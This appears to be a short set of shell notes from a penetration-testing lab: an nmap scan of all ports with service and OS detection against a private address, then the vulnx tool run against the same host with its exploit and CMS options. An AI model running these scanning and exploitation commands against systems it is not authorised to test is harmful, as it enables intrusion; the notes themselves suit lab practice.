sudo nmap 10.0.2.5 --traceroute -p1-65535 -sV -O --osscan-guess -vv A
cd ./vulnx-master/
python vulnx.py -u http://10.0.2.5/ -d -w --exploit --cms